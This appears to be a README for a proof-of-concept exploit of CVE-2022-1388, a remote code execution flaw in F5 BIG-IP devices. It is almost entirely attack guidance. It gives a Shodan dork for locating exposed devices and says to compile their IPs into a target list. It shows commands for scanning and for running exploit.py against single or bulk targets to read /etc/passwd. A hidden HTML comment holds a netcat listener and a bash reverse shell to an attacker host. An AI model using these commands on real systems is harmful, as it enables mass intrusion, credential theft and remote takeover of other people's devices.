# CVE-2022-1388
F5-BIG-IP RCE
- Shodan dork:
```
http.title:"BIG-IP&reg;-Redirect" +"Server"
```
Download the shodan json file and extract all IP addresses from it. You can do this with [shodan-parser](https://github.com/getdrive/POC/blob/main/2023/Ivanti%20Endpoint%20Manager%20Mobile%20(EPMM)/shodan-parser.py) or any other tool.
Save them to the **_list_ip_** file.

Usage
---
- Check:
```
chmod +x scanner.sh; bash scanner.sh
```
- RCE:
```
exploit.py [-h] [-u URL] [-c COMMAND] [-f FILE]
python3 exploit.py -u https://target_IP -c 'cat /etc/passwd'
python3 exploit.py -f urls.txt
```
<!-- Here is an Easter Egg for inquiring minds ;-)
- Reverse Shell:
```
nc -nvlp 8888
python3 exploit.py -u https://target_IP -c "bash -i >&/dev/tcp/attacker_IP/8888 0>&1"
```
-->
